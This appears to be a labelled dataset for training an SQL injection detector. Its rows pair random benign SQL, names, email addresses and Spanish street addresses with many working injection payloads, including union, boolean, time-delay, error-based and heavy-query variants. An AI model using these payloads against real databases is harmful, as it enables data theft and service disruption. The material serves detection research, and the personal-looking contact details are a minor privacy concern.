select * from using where corner between 'bill' and 'off',0,0,0.0
"-9837"" where 7201  =  7201 union all select 7201,7201,7201--",1,1,1.0
"  select weekofyear ( ""2017-06-15"" ) ;",0,0,0.0
select * from task fetch first 50 percent rows onlyselect top 3 * from whistle,0,0,0.0
1  )   where 5418  =  5418 union all select null--,1,1,1.0
alfeiza,0,0,0.004468253314358248
select sleep  (  5  )   and   (  1435  =  1435,1,1,1.0
reinazgo,0,0,0.004468253314358248
select avg ( shown ) from attack select sum ( change ) ,0,0,0.0
select * from sweet where living = 'yourself' limit 3,0,0,0.0
select top 3 * from connected where flew = 'meat',0,0,0.0
brion6,0,0,0.004468253314358248
select * from done where center = 'forty',0,0,0.0
select count (  column_name  )  from table_name where condition ;,0,0,0.01
"select nullif ( ""2017-08-25"", ""2017-08-25"" ) ;",0,0,0.02
-9202' where 9799  =  9799 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --,1,1,1.0
select * from users where id  =  '1' <@&@ or 1  =  1 -- 1',1,1,0.99
"1  )   where 2741  =  2741 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,1,1.0
pincel,0,0,0.004468253314358248
select top 50 percent * from vote select * from simplest fetch first 50 percent rows onlyselect top 3 * from test,0,0,0.0
zazulak,0,0,0.004468253314358248
"select productname, unitprice *  ( unitsinstock + ifnull ( unitsonorder, 0  )  )   from products;",0,0,0.01
"1'  )   as ybuv where 9641  =  9641 union all select null,null,null,null,null,null,null,null--",1,1,1.0
"1""   )    )     )   and elt  (  4249  =  4249,7259  )   and    (    (     (  ""vhmc""  =  ""vhmc",1,1,1.0
-7633'  )   as aslj where 2317  =  2317 or 8571  =  8571--,1,1,1.0
"   select count ( answer ) , stared from anywhere by lady",0,0,0.0
0r90di89r,0,0,0.004468253314358248
mira boncompte,0,0,0.004468253314358248
select * from do  where limited = onto,0,0,0.0
select * from space where place not between 'barn' and 'forest',0,0,0.0
"-4373'+  (  select 'rlht' where 2285  =  2285 union all select 2285,2285,2285#",1,1,1.0
"1"" order by 1--",1,1,1.0
" select * from rock order by port, friend",0,0,0.0
caridad,0,0,0.004468253314358248
select * from tobacco where cookies = 'measure'  and city = 'butter',0,0,0.0
"1""   )    )    and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   ""vjvz"" like ""vjvz",1,1,1.0
4ino57l,0,0,0.004468253314358248
select * from arrange where function not like '[accept]%',0,0,0.0
select avg ( price ) from respect,0,0,0.0
"-6442""   )    )     )   or 3038  =  3038",1,1,1.0
28900,0,0,0.004468253314358248
select top 3 * from idea,0,0,0.0
""" or true--",1,1,0.99
"-3979' in boolean mode  )   union all select 4911,4911,4911,4911,4911,4911,4911,4911,4911,4911#",1,1,1.0
"-6370'   )    )    as sims where 9388  =  9388 union all select 9388,9388,9388,9388,9388,9388,9388,9388#",1,1,1.0
"-2838"" where 5442  =  5442 union all select 5442#",1,1,1.0
select top 3 * from daily where wood = 'appropriate' select * from income,0,0,0.0
select radians ( -45 ) ;,0,0,0.0
"1""   )    )     )   or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,1,1.0
select * from young where highest = 'folks' fetch first 3 rows only,0,0,0.0
"1%'   )    )    and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   '%'  =  '",1,1,1.0
1  )   and   (  7557  =  1711  )  *1711 and   (  5157  =  5157,1,1,1.0
select front ( s )  from remove left join,0,0,0.0
"-8279"" union all select 6598,6598,6598,6598,6598,6598,6598,6598#",1,1,1.0
1  )   where 4711  =  4711,1,1,1.0
select * from strange where rabbit between '1996-07-01' and '1996-07-31',0,0,0.0
1'  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and   (  'mqoj' like 'mqoj,1,1,1.0
select case when 5894  =  4052 then 1 else null end--,1,1,1.0
vilcu-verschuer@eddydaniele.kz,0,0,0.006527024015406931
enseriarse,0,0,0.004468253314358248
mcavoy-zabczynski@discotecateatre.gt,0,0,0.006527024015406931
"-1558 or elt  (  3306  =  2272,2272  )  -- ioxt",1,1,0.99
select avg ( shape ) from man select sum ( jump ) ,0,0,0.0
0a0t4d2r,0,0,0.004468253314358248
33120,0,0,0.004468253314358248
" select * from users where id  =  1 or \<\ union select 1,@@version -- 1",1,1,1.0
"1' in boolean mode  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  #",1,1,1.0
select continent ( s ) from ice inner join,0,0,0.0
select min ( height )  as lost from fair,0,0,0.0
40529,0,0,0.004468253314358248
select min ( list )  as enjoy from happened,0,0,0.0
"c/ barriada nueva andalucia, 79, 5?f",0,0,0.01
select avg ( save ) from require,0,0,0.0
"1'  )   as bfgl where 8959  =  8959 union all select null,null,null,null,null,null,null,null,null,null--",1,1,1.0
"1""  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""vnso"" like ""vnso",1,1,1.0
"   select managed,afternoon,particularly,primitive,stop     (  (  who join follow on length.sum =  variety.ocean )   inner join cryon orders.cake =  cry.goldenid ) ",0,0,0.0
"1'||  (  select 'xuou' from dual where 7681  =  7681 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  ||'",1,1,1.0
pizani@unanuevavisionenortodoncia.tg,0,0,0.004468253314358248
bevis,0,0,0.004468253314358248
69054908f,0,0,0.004468253314358248
cicek0,0,0,0.004468253314358248
"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   ",1,1,1.0
select * from feature  where it not like '[our]%',0,0,0.0
36lis8r,0,0,0.004468253314358248
"1  )   and make_set  (  8403  =  8403,8899  )   and   (  9761  =  9761",1,1,1.0
select * from sport where joy  between 10 and 20,0,0,0.0
"   select contrast, men+ ', ' + family+ ' ' + ourselves+ ', ' + thy as applied  from chest",0,0,0.0
select * from across fetch first 3 rows only select top 50 percent * from reason,0,0,0.0
"   select rear, hurry, wherefrom surprise where as  is not null",0,0,0.0125
"   select count ( conversation ) , under from anything by seen",0,0,0.0
kin-yee,0,0,0.006527024015406931
"1'   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'hfqz'  =  'hfqz",1,1,1.0
rashmi,0,0,0.004468253314358248
enconadura,0,0,0.004468253314358248
select * from wonderful where warn = 'health' limit 3,0,0,0.0
"-6639'  )   as trll where 6271  =  6271 union all select 6271,6271,6271#",1,1,1.0
benedict@deltamarina.ve,0,0,0.004468253314358248
" select * from stand order by equipment, from",0,0,0.0
ca10a5uda,0,0,0.004468253314358248
select min ( religious )  as bottom from situation,0,0,0.0
select count ( spoken )  from explanation,0,0,0.0
"   select colony, tonight+ ', ' + effect+ ' ' + almost+ ', ' + salt as led  from most",0,0,0.0
select * from year where price not between 10 and 20,0,0,0.0
select avg ( writing ) from tales select sum ( shake ) ,0,0,0.0
1  )   where 2918  =  2918 and 7533  =  7533--,1,1,0.98
1' where 4460  =  4460,1,1,1.0
"1  )   and elt  (  7425  =  8842,8842  )   and   (  9194  =  9194",1,1,1.0
1' in boolean mode  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   #,1,1,1.0
select * from  ( select locate from root ) ,0,0,0.0
; execute immediate 'sel' || 'ect us' || 'er',1,1,0.6163006903869266
avril,0,0,0.004468253314358248
select   (  case when   (  6434  =  3877  )   then 6434 else 1/  (  select 0  )   end  )  --,1,1,1.0
wardle,0,0,0.004468253314358248
"1'   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'skdm'  =  'skdm",1,1,1.0
"calle barrio carmelo 21,",0,0,0.11
"1%' and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and '%'  =  '",1,1,1.0
55235483v,0,0,0.004468253314358248
dieasl_yannatos@vilainstal.coop,0,0,0.004468253314358248
"-2568""  )   or   (  8459  =  8459  )  *4906 and   (  ""exyw""  =  ""exyw",1,1,1.0
"1 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  # vojr",1,1,1.0
-1765'  )   order by 1--,1,1,1.0
"1'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  'dtym'  =  'dtym",1,1,1.0
select * from stepped where mud between '1996-07-01' and '1996-07-31',0,0,0.0
feix ablitas,0,0,0.004468253314358248
"1""   )    )    as ynuw where 9138  =  9138",1,1,1.0
"  select neededid as id, street as carried from chest",0,0,0.0
select * from vessels fetch first 3 rows only,0,0,0.0
1  )   as qgsb where 7600  =  7600 and 2006  =  2006,1,1,0.9616666666666666
select excitement ( s )  from lamp full outer join,0,0,0.0
amedee@spainbb.cc,0,0,0.004468253314358248
delete from express where adult = 'spin',0,0,0.0
" select * from users where id  =  1 or ""@?"" or 1  =  1 -- 1",1,1,1.0
select * from find where price not between 10 and 20,0,0,0.0
select * from name 3 select * from pocket,0,0,0.0
calle laguna de pealara 171 12-e,0,0,0.0
1   )    )     )   and 6467  =  1864#,1,1,1.0
delete from orange where dream = 'sold',0,0,0.0
hi' or 'x'  =  'x';,1,1,0.92
6onc+hesta,0,0,0.004468253314358248
select * from manufacturing where inside between studied09/01/1996kept and entirely15/31/1996damage,0,0,0.0
"-3737%"" union all select 4452,4452,4452#",1,1,1.0
select roll from exclaimed union all select rabbit from struggle order by office,0,0,0.0
from  ( select distinct building from win ) ,0,0,0.0
select * from mass where rubbed  between 10 and 20,0,0,0.0
"1' where 2160  =  2160 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1,1,1.0
select * from gold where letter in  ( select spin from bare ) ,0,0,0.0
select * from likely where equally = 'is',0,0,0.0
"1""   )    )     )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  ""ytju"" like ""ytju",1,1,1.0
balcells parets,0,0,0.004468253314358248
select   (  case when   (  8978  =  1426  )   then 1 else 8978*  (  select 8978 from master..sysdatabases  )   end  )  --,1,1,1.0
select avg ( grain )  from label  select sum ( available ) ,0,0,0.0
1' in boolean mode  )   or sleep  (  5  )  #,1,1,1.0
"-3349' or elt  (  6610  =  4379,4379  )   and 'poqm' like 'poqm",1,1,1.0
select count ( distinct next )  from softly,0,0,0.0
" select column_name ( s )  from vapor,name",0,0,0.0
select * from rush order by important,0,0,0.0
select * from  ( select wild from deeply ) ,0,0,0.0
"1'  )   as ohnu where 4097  =  4097 union all select null,null,null,null,null,null,null,null,null--",1,1,1.0
"1   )    )     )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,1,1.0
rec,0,0,0.004468253314358248
select * from dollar where political between '1996-07-01' and '1996-07-31',0,0,0.0
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  ""ekbq""  =  ""ekbq",1,1,1.0
jandtegui curell,0,0,0.004468253314358248
"1"" or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and ""kins""  =  ""kins",1,1,1.0
select rose ( s from glass right join,0,0,0.0
select avg ( noon ) from finger,0,0,0.0
"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 6631 )  order by meta_id asc",0,0,0.0
"paseo francisco mir berlanga 141, 12-e",0,0,0.0
ab_ogadora,0,0,0.004468253314358248
sant aniol de finestres,0,0,0.0
"   select share, spider, plates from easy where making  is null",0,0,0.0
bernab,0,0,0.004468253314358248
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (     (  'knbx' like 'knbx",1,1,1.0
"  select orders.breadrid, employees.mountain, employees.compass from ordersright join employees on orders.employeeid  =  employees.societyid order by orders.vaporid",0,0,0.0
bocana$da,0,0,0.004468253314358248
select eager,0,0,0.03250505488953901
wei-tsig8,0,0,0.006527024015406931
select count ( numeral ) from breeze,0,0,0.0
select * from space where adult like '%situation%',0,0,0.0
"  select mix,iron from least where rear = 'terrible' union select railroad, everybody from is",0,0,0.0
38980059g,0,0,0.004468253314358248
"-5161%"" or   (  1437  =  4869  )  *4869 and ""%""  =  """,1,1,0.98
" select * from traffic order by help asc, essential desc",0,0,0.0
"-9988%"" or elt  (  1032  =  1032,3623  )   and ""%""  =  """,1,1,1.0
frades,0,0,0.004468253314358248
17120,0,0,0.004468253314358248
select * from wp_posts where id  =  28620 limit 1,0,0,0.0
$despumar,0,0,0.004468253314358248
"1 where 7932  =  7932 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1,1,1.0
select * from firm fetch first 3 rows only select top 50 percent * from quite,0,0,0.0
"1'   )    )    as rxhe where 3838  =  3838 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,1,1.0
"c/ codigo correspondencia oficial correos-telegrafos 71, 10d",0,0,0.0
15142,0,0,0.004468253314358248
1%'   )    )     )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (     (  '%'  =  ',1,1,1.0
intuitivo,0,0,0.004468253314358248
8.27854e+15,0,0,0.0
"select * from river where riding between ""crack"" and    ""skill""",0,0,0.0
en8og1da,0,0,0.004468253314358248
"1%""   )    )     )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  ""%""  =  """,1,1,1.0
"  select back as himself, sand as [clay]  from shelter",0,0,0.0
1  )   where 1090  =  1090 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,1,1,1.0
nogueras,0,0,0.004468253314358248
1' and 9198  =  9198--,1,1,0.98
select * from happy where road = 'operation' limit 3,0,0,0.0
select count ( struck )  from teach,0,0,0.0
select stood ( s )  from pipe union,0,0,0.0
or 0  =  0 #,1,1,0.9308333333333334
brittani,0,0,0.004468253314358248
select * from  ( select former from frame ) ,0,0,0.0
1'  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and   (  'eqfh'  =  'eqfh,1,1,1.0
"1 where 7906  =  7906 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,1,1.0
methi,0,0,0.004468253314358248
eoin,0,0,0.004468253314358248
"1"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""ymwb""  =  ""ymwb",1,1,1.0
1'   )    )     )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (     (  'vtoi' like 'vtoi,1,1,1.0
quintanilla del coco,0,0,0.0
select * from ship  where dinner not like '[sentence]%',0,0,0.0
select count ( jack ) from failed,0,0,0.0
7s0av07rido,0,0,0.004468253314358248
"1%""   )    )     )   union all select null--",1,1,1.0
select * from in where curious between thin09/01/1996nor and lack15/31/1996personal,0,0,0.0
select top 3 * from ran,0,0,0.0
49893169m,0,0,0.004468253314358248
1'  )   as dqgr where 2427  =  2427 and   (  3020  =  3020  )  *6703--,1,1,1.0
select * from quick where essential = 'grabbed' limit 3,0,0,0.0
select * from  ( select life from paid ) ,0,0,0.0
"-1083'  )   union all select 9993,9993,9993,9993,9993,9993,9993,9993,9993--",1,1,1.0
" select * from users where id  =  1.*1 union select 1,banner from v$version where rownum  =  1 -- 1",1,1,1.0
select * from origin 3,0,0,0.0
select * from capital where kill = 'oxygen'  or airplane = 'known',0,0,0.0
select * from orders where orderdate between #07/01/1996# and #07/31/1996#;,0,0,0.09
"-2131"" or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""wpsf"" like ""wpsf",1,1,1.0
select bound ( s )  from teeth union,0,0,0.0
"1' and make_set  (  8403  =  8403,8899  )  ",1,1,0.9700486978615287
1  )   and 3659  =  5475 and   (  8949  =  8949,1,1,0.99
"1  )   where 1513  =  1513 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,1,1.0
select highest ( s )  from taken union all,0,0,0.0
" select * from recent order by swept, play",0,0,0.0
ronet_huebner@nikemujeres.bm,0,0,0.004468253314358248
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  ||'",1,1,1.0
fowley5@virginislands.com.eg,0,0,0.0
select top 3 * from brief where monkey = 'changing',0,0,0.0
select * from moon 3,0,0,0.0
"1'   )    )    as icik where 1440  =  1440 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,1,1.0
"  select his as available, medicine as [hope]  from vegetable",0,0,0.0
4.94547e+15,0,0,0.0
select top 3 * from decide,0,0,0.0
select * from simply order by desk desc,0,0,0.0
select * from sound where shot between '1996-07-01' and '1996-07-31',0,0,0.0
select * from flew where flame not like 'of%',0,0,0.0
-9191'  )   as qtvm where 2838  =  2838 or   (  8459  =  8459  )  *4906--,1,1,1.0
select top 3 * from popular where blow = 'scared',0,0,0.0
"1  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  6786  =  6786",1,1,1.0
"   select complete,sit,push,including,compare     (  (  energy join use on row.not =  door.southern )   inner join policemanon orders.halfway =  explain.pitchid ) ",0,0,0.0
" select * from users where id  =  1 or ""%{"" or 1  =  1 -- 1",1,1,1.0
"1'   )    )    and elt  (  4249  =  4249,7259  )   and    (    (   'xjns'  =  'xjns",1,1,1.0
select * from industrial where cross = 'bridge' fetch first 3 rows only,0,0,0.0
select column_name ( s )  from table1 full outer join,0,0,0.0
1' where 1652  =  1652 and sleep  (  5  )  #,1,1,1.0
select * from in where behavior = 'heart' limit 3,0,0,0.0
select skill ( s )  from worse union,0,0,0.0
select * from service order by connected,0,0,0.0
4.64693e+15,0,0,0.0
select * from slave,0,0,0.0
select * from what,0,0,0.0
1  )   as fnpq where 5209  =  5209,1,1,1.0
select * from seeing where there between '1996-07-01' and '1996-07-31',0,0,0.0
"insert into safety ( swam, alphabet, bean, character, blood, tree )  values  ( 'pass', 'dropped'. verb', 'chapter', 'important', 'way', 'zebra' )  ",0,0,0.0
"c/ francisco javier simonet 7, 11?e",0,0,0.0
" select * from users where id  =  1 or "",&"" or 1  =  1 -- 1",1,1,1.0
1   )    )    as ehlg where 6340  =  6340,1,1,1.0
guillen,0,0,0.004468253314358248
bestard,0,0,0.004468253314358248
select * from complex where one like '%cut%',0,0,0.0
bonfiglio cabanas,0,0,0.004468253314358248
mieza,0,0,0.004468253314358248
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  ""yobb"" like ""yobb",1,1,1.0
"1%""  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,1,1.0
"1""  )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and   (  ""mrsl""  =  ""mrsl",1,1,1.0
duby@mtos.mt,0,0,0.004468253314358248
select * from lake where stuck = 'won',0,0,0.0
"1%'   )    )     )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  '%'  =  '",1,1,1.0
"-2743 union all select 6757,6757,6757,6757,6757,6757--",1,1,1.0
select * from child where today = 'depth' limit 3,0,0,0.0
select top 3 * from forty select * from movie 3select * from like,0,0,0.0
1'   )    )     )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (     (  'eihl'  =  'eihl,1,1,1.0
select min ( stiff )  as salt from plane,0,0,0.0
germe,0,0,0.004468253314358248
1'   )    )    as cpwx where 5378  =  5378 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1,1,1.0
"1%' or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1,1,1.0
06363808f,0,0,0.004468253314358248
"1' union all select null,null,null,null,null,null,null,null,null#",1,1,1.0
"1%' or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1,1,0.99
"  select excellent,funny from salt where but = 'means' union select muscle, percent from statement",0,0,0.0
from  ( select distinct radio from iron ) ,0,0,0.0
select count ( method )  from fort,0,0,0.0
1'   )    )    as jzoh where 6484  =  6484 and 7364  =  4233--,1,1,1.0
select * from being fetch first 3 rows only,0,0,0.0
select * from job where wash = 'floating' fetch first 3 rows only,0,0,0.0
" select * from being order by said asc, coal desc",0,0,0.0
select count ( * )  as lay,0,0,0.0
select * from behavior where uncle not like 'ruler%',0,0,0.0
select pig from near union select position from earth order by happen,0,0,0.0
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  'yvbb'  =  'yvbb",1,1,1.0
select avg ( policeman )  from memory  select sum ( clothes ) ,0,0,0.0
"1"" where 2235  =  2235 union all select null,null,null,null,null--",1,1,1.0
1   )    )    as skex where 7941  =  7941 and sleep  (  5  )  --,1,1,1.0
1'   )    )    and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'cuav'  =  'cuav,1,1,1.0
1.16e+15,0,0,0.0
"1""  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  ""oxxi""  =  ""oxxi",1,1,1.0
1  )   as mtda where 3951  =  3951,1,1,1.0
1'+  (  select 'mquh' where 3933  =  3933,1,1,1.0
"  select orders.hairrid, employees.ranch, employees.teacher from ordersright join employees on orders.employeeid  =  employees.askid order by orders.knifeid",0,0,0.0
"calle catedratico eugenio ubeda romero, s/n,",0,0,0.0
select * from president,0,0,0.0
"-3261""   )    )     )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  ""yxms""  =  ""yxms",1,1,1.0
"1'  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  'plfa'  =  'plfa",1,1,1.0
"1""   )    )     )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (     (  ""tabq"" like ""tabq",1,1,1.0
"  select got,author from might where sand = 'journey' union select including, hard from letter",0,0,0.0
"  select makedate ( 2017, 175 ) ;",0,0,0.0
"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'zenl' like 'zenl",1,1,1.0
"calle ponte vella s/n, 13e",0,0,0.0
"1' and elt  (  4249  =  4249,7259  )  ",1,1,0.99
"insert into lead ( hair, spend, nature, quiet, while, great )  values  ( 'took', 'route'. zulu', 'rhythm', 'rule', 'blue', 'during' )  ",0,0,0.0
"1  )   as bgvd where 1753  =  1753 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,1,1.0
"1'   )    )    or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   'rdpv'  =  'rdpv",1,1,1.0
select avg ( wrote )  from composition  select sum ( wore ) ,0,0,0.0
select top 50 percent * from butter select * from tribe fetch first 50 percent rows onlyselect top 3 * from please,0,0,0.0
select * from carbon where indicate = 'paragraph' fetch first 3 rows only,0,0,0.0
select count ( gladid ) from pair,0,0,0.0
"-4811%'   )    )    or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   '%'  =  '",1,1,1.0
select * from setting where hearing between angry09/01/1996pay and such15/31/1996cold,0,0,0.0
"-5516'+  (  select 'bmlv' where 7188  =  7188 union all select 7188,7188,7188,7188,7188,7188,7188,7188#",1,1,1.0
4358,0,0,0.004468253314358248
"-8902 union all select 4339,4339,4339#",1,1,1.0
"1""  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  ""kxws"" like ""kxws",1,1,1.0
8.0957e+15,0,0,0.0
46183,0,0,0.004468253314358248
"1""   )    )    as gprr where 5975  =  5975 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1,1,1.0
select * from far where mass = 'birds',0,0,0.0
"   select anybody, dish, forestfrom coal where apartment  is not null",0,0,0.0
-8248 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  ) ,1,1,1.0
 update new set silver = 'slabs'where headed = 'shoe',0,0,0.0
"oso, el",0,0,0.0
swinton@voragolive.kz,0,0,0.004468253314358248
6.1643e+15,0,0,0.0
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  'mfib'  =  'mfib",1,1,1.0
mandbula,0,0,0.004468253314358248
"1"" or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  ",1,1,1.0
1'||  (  select 'ymre' where 8681  =  8681,1,1,1.0
2.94331e+14,0,0,0.0
b4rl942r7,0,0,0.004468253314358248
select * from welcome,0,0,0.0
select * from garden where bear not like '[hill]%',0,0,0.0
"  update bag set pet =  'consonant', city =  'another' where outer =  title",0,0,0.0
1'  )   where 5378  =  5378,1,1,1.0
slezak@ballerpoker.kn,0,0,0.004468253314358248
"1'   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   'cwjd'  =  'cwjd",1,1,1.0
sagaceta farell,0,0,0.004468253314358248
"insert into pick ( tip, could, specific, far, explore, seat )  values  ( 'complete', 'nine'. therefore', 'careful', 'consonant', 'grown', 'become' )  ",0,0,0.0
2252,0,0,0.004468253314358248
1  )   as ratg where 3033  =  3033 union all select null--,1,1,0.99
select * from donkey 3 select * from shut,0,0,0.0
15873,0,0,0.004468253314358248
sanromn casuso,0,0,0.004468253314358248
select option_value from wp_options where option_name  =  '_houzez_property_label_2691' limit 1,0,0,0.0
select * from generally where master = 'right' fetch first 3 rows only,0,0,0.0
